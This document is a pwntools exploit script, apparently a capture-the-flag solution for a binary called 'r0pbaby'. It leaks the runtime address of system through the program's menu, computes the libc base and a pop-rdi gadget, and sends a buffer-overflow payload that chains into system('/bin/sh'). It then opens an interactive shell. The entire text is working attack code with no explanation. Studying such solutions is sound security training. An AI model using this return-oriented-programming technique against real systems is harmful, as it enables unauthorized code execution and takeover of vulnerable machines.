from pwn import *

elf = ELF('lib.so.6')

base_libc_addr = elf.symbols['__libc_start_main']

system_addr = elf.symbols['system']

sh_addr = elf.search('/bin/sh').next()

offset_system_addr = system_addr - base_libc_addr
offset_sh_addr = sh_addr - base_libc_addr
offset_pr_addr = 0x2144f - system_addr


p = process('./r0pbaby')
p.recvuntil('Menu:')
p.recvuntil(':')
p.sendline("2")
p.recvuntil(':')
p.sendline('system')
p.recvuntil(':')
system_addr_real = int(p.recvline(), 16)

libc_base = system_addr_real - offset_system_addr
print "libc_base = " + hex(libc_base)
rdi_addr = system_addr_real + offset_pr_addr
print "rdi_addr = " + hex(rdi_addr)
binsh_addr = libc_base + offset_sh_addr
print "binsh_addr = " + hex(binsh_addr)
print "system_addr = " + hex(system_addr_real)

payload = "A" * 8 + p64(rdi_addr) + p64(binsh_addr) + p64(system_addr_real)

p.recv(1024)
p.sendline('3')
p.recv(1024)
p.send("%d\n"%(len(payload)+1))
p.sendline(payload)
p.sendline('4')

p.interactive()
